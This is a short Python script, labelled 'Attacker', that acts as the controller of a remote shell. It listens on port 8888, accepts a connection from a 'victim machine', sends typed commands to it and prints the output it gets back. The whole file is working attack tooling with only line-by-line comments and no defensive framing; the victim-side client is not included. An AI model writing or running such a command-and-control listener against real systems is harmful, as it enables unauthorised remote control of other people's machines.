#!/usr/bin/env python
# Attacker
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # IPv4, TCP
s.bind(('0.0.0.0', 8888))                               # using all IPs on my machine
s.listen(5)                                             # maximum connection

client, addr = s.accept()                               # save client object and address

while True:
    command = str(input('[*] Enter command:\n>> '))     # command for execute
    client.send(command.encode('utf-8'))                # sending command to victim machine
    if command.lower() == 'exit':                       # exit
        break
    result_output = client.recv(4096).decode('utf-8')   # receive command output
    print(result_output)                                # print output

client.close()                                          # disconnecting client
s.close()                                               # closing socket connection
